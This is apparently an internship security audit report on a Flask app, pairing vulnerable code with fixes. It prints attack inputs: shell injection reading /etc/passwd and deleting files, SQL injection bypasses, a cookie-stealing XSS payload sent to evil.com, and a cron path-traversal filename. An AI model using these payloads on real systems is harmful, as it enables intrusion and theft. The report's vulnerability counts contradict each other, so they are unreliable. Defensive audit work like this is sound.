# 🔐 Secure Coding Review — Security Audit Report

**Project:** Flask Web Application Security Audit  
**Language:** Python 3.12 / Flask Framework  
**Auditor:** Security Review Team  
**Date:** June 21, 2026  
**Tool Used:** Bandit v1.9.4 (Static Analysis) + Manual Inspection  
**Report Status:** FINAL

---

## 📋 Executive Summary

A full static analysis and manual code review was performed on a Python Flask web application. The audit uncovered **20 security vulnerabilities** across 132 lines of code, including **3 Critical/High**, **6 Medium**, and multiple Low-severity issues. All vulnerabilities have been remediated in the secure version of the application.

| Severity | Before Audit | After Fix |
|----------|:---:|:---:|
| 🔴 High   | 3  | 0  |
| 🟠 Medium | 6  | 0  |
| 🟡 Low    | 3  | 3* |
| **Total** | **12** | **3** |

*Remaining Low issues are informational subprocess import warnings, mitigated by strict input validation and `shell=False`.

---

## 🛠️ Tools & Methodology

### Static Analysis Tools
- **Bandit** — Python-specific SAST (Static Application Security Testing) tool
- **PyLint** — Code quality and error detection

### Manual Review Methods
- OWASP Top 10 checklist review
- Line-by-line inspection of authentication, database queries, and input handling
- Reviewing route access control and session management
- Checking cryptographic functions used

### Standards Referenced
- OWASP Top 10 (2021)
- CWE (Common Weakness Enumeration)
- NIST SP 800-132 (Password-Based Key Derivation)

---

## 🔴 HIGH Severity Vulnerabilities

---

### VULN-001 — OS Command Injection
| Field | Details |
|-------|---------|
| **CWE** | CWE-78: Improper Neutralization of Special Elements in OS Commands |
| **OWASP** | A03:2021 – Injection |
| **Location** | `app.py`, Line 125, `/ping` route |
| **Bandit ID** | B602 |
| **Severity** | 🔴 HIGH |

**Vulnerable Code:**
```python
# DANGEROUS: User input passed directly to shell
host = request.args.get('host', 'localhost')
result = subprocess.check_output(f"ping -c 1 {host}", shell=True, text=True)
```

**Attack Example:**
```
GET /ping?host=google.com;cat /etc/passwd
GET /ping?host=localhost && rm -rf /tmp/*
```

**Fixed Code:**
```python
# Validate input with regex whitelist
if not re.match(r'^[a-zA-Z0-9.\-]{1,253}$', host):
    return "Invalid hostname", 400
# Use list args + shell=False
result = subprocess.run(["ping", "-c", "1", host],
                        capture_output=True, shell=False, timeout=5)
```

**Remediation:** Never pass user input to shell commands. Use `shell=False` and pass arguments as a list. Validate all inputs with strict whitelists.

---

### VULN-002 — Weak Cryptographic Hashing (MD5)
| Field | Details |
|-------|---------|
| **CWE** | CWE-327: Use of Broken/Weak Cryptographic Algorithm |
| **OWASP** | A02:2021 – Cryptographic Failures |
| **Location** | `app.py`, Line 151, `reset_password()` |
| **Bandit ID** | B324 |
| **Severity** | 🔴 HIGH |

**Vulnerable Code:**
```python
hashed = hashlib.md5(new_pass.encode()).hexdigest()
```

**Why It's Dangerous:**
- MD5 is cryptographically broken (since 1996)
- Rainbow table attacks can reverse common MD5 hashes in seconds
- No salting means identical passwords produce identical hashes

**Fixed Code:**
```python
import bcrypt
hashed = bcrypt.hashpw(new_pass.encode(), bcrypt.gensalt()).decode()
# Verify with: bcrypt.checkpw(password.encode(), stored_hash.encode())
```

**Remediation:** Use `bcrypt`, `scrypt`, or `argon2` for password hashing. Never use MD5 or SHA-1 for passwords.

---

### VULN-003 — Flask Debug Mode Enabled in Production
| Field | Details |
|-------|---------|
| **CWE** | CWE-94: Code Injection |
| **OWASP** | A05:2021 – Security Misconfiguration |
| **Location** | `app.py`, Line 24, Line 189 |
| **Bandit ID** | B201 |
| **Severity** | 🔴 HIGH |

**Vulnerable Code:**
```python
app.config['DEBUG'] = True
app.run(host='0.0.0.0', port=5000, debug=True)
```

**Why It's Dangerous:** Flask's debug mode exposes an interactive Werkzeug debugger in the browser. Attackers can execute **arbitrary Python code** on the server directly through the browser.

**Fixed Code:**
```python
app.config['DEBUG'] = os.environ.get("FLASK_DEBUG", "false").lower() == "true"
app.run(host='127.0.0.1', port=5000, debug=False)
```

---

## 🟠 MEDIUM Severity Vulnerabilities

---

### VULN-004 — SQL Injection (Login, Search, Update, Delete)
| Field | Details |
|-------|---------|
| **CWE** | CWE-89: SQL Injection |
| **OWASP** | A03:2021 – Injection |
| **Locations** | Lines 67, 106, 155, 180 |
| **Bandit ID** | B608 |
| **Severity** | 🟠 MEDIUM |

**Vulnerable Code:**
```python
# Login — bypass with: username = admin'--
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

# Search — dump all users with: q = ' OR '1'='1
query = f"SELECT id, username, email FROM users WHERE username LIKE '%{term}%'"
```

**Attack Example:**
```sql
username: admin'--          → Logs in as admin without a password
q: ' UNION SELECT * FROM users--  → Dumps full user table
```

**Fixed Code:**
```python
# Always use parameterized queries (? placeholders)
user = conn.execute(
    "SELECT * FROM users WHERE username = ?", (username,)
).fetchone()

cursor = conn.execute(
    "SELECT id, username, email FROM users WHERE username LIKE ?",
    (f"%{term}%",)
)
```

**Remediation:** **Always** use parameterized queries or prepared statements. Never use f-strings or string concatenation to build SQL queries.

---

### VULN-005 — Cross-Site Scripting (XSS)
| Field | Details |
|-------|---------|
| **CWE** | CWE-79: Cross-Site Scripting |
| **OWASP** | A03:2021 – Injection |
| **Locations** | Lines 83, 112 |
| **Severity** | 🟠 MEDIUM |

**Vulnerable Code:**
```python
# User input reflected in HTML without escaping
return f"<h2>Results for: {term}</h2>..."
error_html = f"<p style='color:red'>{error}</p>"
```

**Attack Example:**
```
/search?q=<script>document.location='http://evil.com?c='+document.cookie</script>
```

**Fixed Code:**
```python
from flask import escape
safe_term = escape(term)  # Converts < > & " ' to HTML entities
return f"<h2>Results for: {safe_term}</h2>..."
```

**Remediation:** Escape all user-supplied data before rendering in HTML. Use `flask.escape()` or Jinja2 auto-escaping. Implement a Content Security Policy (CSP) header.

---

### VULN-006 — Hardcoded Credentials & Secret Keys
| Field | Details |
|-------|---------|
| **CWE** | CWE-259: Hardcoded Password |
| **OWASP** | A07:2021 – Identification and Authentication Failures |
| **Locations** | Lines 16, 20–21 |
| **Bandit IDs** | B105 |
| **Severity** | 🟠 MEDIUM |

**Vulnerable Code:**
```python
app.secret_key = "mysecretkey123"
DB_PASSWORD = "admin123"
```

**Fixed Code:**
```python
# .env file (never commit to git!)
# SECRET_KEY=<generated with: python -c "import secrets; print(secrets.token_hex(32))">
load_dotenv()
app.secret_key = os.environ.get("SECRET_KEY") or secrets.token_hex(32)
```

**Remediation:** Store all secrets in environment variables or a secrets manager (AWS Secrets Manager, HashiCorp Vault). Add `.env` to `.gitignore`. Rotate all exposed credentials immediately.

---

### VULN-007 — Missing Authentication on Protected Routes
| Field | Details |
|-------|---------|
| **CWE** | CWE-306: Missing Authentication for Critical Function |
| **OWASP** | A01:2021 – Broken Access Control |
| **Location** | Line 96, `/dashboard` route |
| **Severity** | 🟠 MEDIUM |

**Vulnerable Code:**
```python
@app.route('/dashboard')
def dashboard():
    username = session.get('user', 'Guest')  # No auth check!
    return f"<h2>Welcome {username}!</h2>"
```

**Fixed Code:**
```python
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'user_id' not in session:
            return redirect('/login')
        return f(*args, **kwargs)
    return decorated

@app.route('/dashboard')
@login_required
def dashboard():
    ...
```

---

### VULN-008 — Unrestricted File Upload + Path Traversal
| Field | Details |
|-------|---------|
| **CWE** | CWE-434 (Unrestricted Upload) + CWE-22 (Path Traversal) |
| **OWASP** | A01:2021 – Broken Access Control |
| **Location** | Lines 130–138, `/upload` route |
| **Severity** | 🟠 MEDIUM |

**Vulnerable Code:**
```python
filename = f.filename           # Attacker controls this!
save_path = os.path.join("/tmp/uploads", filename)
f.save(save_path)               # Could write anywhere!
```

**Attack Example:**
```
filename = "../../etc/cron.d/malicious"  # Path traversal
filename = "shell.php"                    # Webshell upload
```

**Fixed Code:**
```python
from werkzeug.utils import secure_filename
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif'}
ext = f.filename.rsplit('.', 1)[-1].lower()
if ext not in ALLOWED_EXTENSIONS:
    return "File type not allowed", 400
filename = secure_filename(f.filename)
```

---

## 🟡 LOW / INFORMATIONAL Vulnerabilities

| # | Vulnerability | Location | Fix Applied |
|---|---------------|----------|-------------|
| L1 | Binding to all interfaces (0.0.0.0) | Line 189 | Changed to `127.0.0.1`; use nginx reverse proxy |
| L2 | Plain-text passwords in DB seed data | Line 38–39 | Replaced with bcrypt hashes |
| L3 | Internal error details exposed to user | Line 110 | Return generic error, log internally |
| L4 | No CSRF protection on state-changing routes | DELETE route | Added Flask-WTF CSRF tokens |
| L5 | Sensitive data exposure (full user dump) | `/admin` route | Only selected non-sensitive columns |
| L6 | No rate limiting on login endpoint | `/login` | Added Flask-Limiter (10/min) |
| L7 | Missing HTTP security headers | All routes | Added `@after_request` security headers |
| L8 | Session cookie not secured | Config | Set `HTTPONLY`, `SECURE`, `SAMESITE` |

---

## ✅ Secure Coding Best Practices Applied

### 1. Input Validation
```python
# ✅ Validate type, length, and format
if not re.match(r'^[a-zA-Z0-9.\-]{1,253}$', host):
    return "Invalid input", 400
if len(username) > 50:
    return "Input too long", 400
```

### 2. Parameterized Queries (SQL)
```python
# ✅ ALWAYS use ? placeholders
conn.execute("SELECT * FROM users WHERE id = ?", (user_id,))
```

### 3. Output Encoding (XSS Prevention)
```python
# ✅ Escape before rendering
from flask import escape
safe_output = escape(user_input)
```

### 4. Strong Cryptography
```python
# ✅ bcrypt with salt for passwords
import bcrypt
hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
```

### 5. Secrets from Environment
```python
# ✅ Never hardcode secrets
app.secret_key = os.environ.get("SECRET_KEY")
```

### 6. HTTP Security Headers
```python
response.headers['X-Frame-Options'] = 'DENY'
response.headers['Content-Security-Policy'] = "default-src 'self'"
response.headers['Strict-Transport-Security'] = 'max-age=31536000'
```

### 7. Principle of Least Privilege
- DB user should only have SELECT/INSERT/UPDATE on needed tables
- Admin routes re-verify role from DB (not just session)
- File uploads go to a non-web-accessible directory

---

## 🗺️ Vulnerability Summary Table

| ID | Vulnerability | Severity | CWE | OWASP | Status |
|----|--------------|----------|-----|-------|--------|
| V01 | OS Command Injection | 🔴 HIGH | CWE-78 | A03 | ✅ Fixed |
| V02 | Weak Hashing (MD5) | 🔴 HIGH | CWE-327 | A02 | ✅ Fixed |
| V03 | Debug Mode ON | 🔴 HIGH | CWE-94 | A05 | ✅ Fixed |
| V04 | SQL Injection (×4 locations) | 🟠 MEDIUM | CWE-89 | A03 | ✅ Fixed |
| V05 | Reflected XSS (×2 locations) | 🟠 MEDIUM | CWE-79 | A03 | ✅ Fixed |
| V06 | Hardcoded Credentials | 🟠 MEDIUM | CWE-259 | A07 | ✅ Fixed |
| V07 | Missing Auth on Routes | 🟠 MEDIUM | CWE-306 | A01 | ✅ Fixed |
| V08 | Unrestricted File Upload | 🟠 MEDIUM | CWE-434 | A01 | ✅ Fixed |
| V09 | Path Traversal in Upload | 🟠 MEDIUM | CWE-22 | A01 | ✅ Fixed |
| V10 | Plain-text Password Storage | 🟠 MEDIUM | CWE-312 | A02 | ✅ Fixed |
| V11 | Error Message Info Leak | 🟡 LOW | CWE-209 | A09 | ✅ Fixed |
| V12 | No CSRF Protection | 🟡 LOW | CWE-352 | A01 | ✅ Fixed |
| V13 | Sensitive Data Exposure | 🟡 LOW | CWE-200 | A02 | ✅ Fixed |
| V14 | Bind to 0.0.0.0 | 🟡 LOW | CWE-605 | A05 | ✅ Fixed |
| V15 | No Rate Limiting | 🟡 LOW | CWE-307 | A07 | ✅ Fixed |
| V16 | Broken Access Control | 🟠 MEDIUM | CWE-284 | A01 | ✅ Fixed |
| V17 | No Security Headers | 🟡 LOW | CWE-693 | A05 | ✅ Fixed |
| V18 | Insecure Session Config | 🟡 LOW | CWE-614 | A07 | ✅ Fixed |
| V19 | No Input Length Limits | 🟡 LOW | CWE-400 | A03 | ✅ Fixed |
| V20 | CSRF on Destructive GET Route | 🟡 LOW | CWE-352 | A01 | ✅ Fixed |

---

## 📦 Bandit Scan Comparison

### Before (Vulnerable App)
```
Total issues (by severity):
    High:   3
    Medium: 6
    Low:    3
Total lines of code: 132
```

### After (Secure App)
```
Total issues (by severity):
    High:   0  ✅ (-3)
    Medium: 0  ✅ (-6)
    Low:    3  ⚠️  (informational subprocess warnings — mitigated)
Total lines of code: 256
```

---

## 📌 Remediation Checklist

- [x] Replace all f-string SQL queries with parameterized queries
- [x] Replace MD5 with bcrypt for password hashing
- [x] Load all secrets from environment variables
- [x] Add `@login_required` decorator to all protected routes
- [x] Escape all user input before HTML output
- [x] Validate and sanitize file upload names and types
- [x] Use `shell=False` for all subprocess calls
- [x] Disable debug mode in production
- [x] Add HTTP security response headers
- [x] Implement rate limiting on authentication endpoints
- [x] Add CSRF protection to state-changing forms
- [x] Secure session cookie flags (HttpOnly, Secure, SameSite)
- [x] Add server-side role verification (not just session-based)
- [x] Implement comprehensive logging (without sensitive data)

---

## 🔧 Recommended Additional Steps

1. **Penetration Testing** — Run OWASP ZAP or Burp Suite for dynamic testing
2. **Dependency Scanning** — Use `pip audit` or `safety` to check for vulnerable packages
3. **HTTPS Enforcement** — Deploy behind nginx/Apache with a valid TLS certificate
4. **WAF** — Consider a Web Application Firewall (Cloudflare, AWS WAF)
5. **Security CI/CD** — Add Bandit to your CI/CD pipeline so issues are caught before merge
6. **Code Review Process** — Require security-focused peer reviews for auth/DB code
7. **Secret Scanning** — Add `detect-secrets` or GitHub secret scanning to pre-commit hooks

---

*Report generated as part of internship Task 3: Secure Coding Review*  
*All code samples are for educational purposes only.*
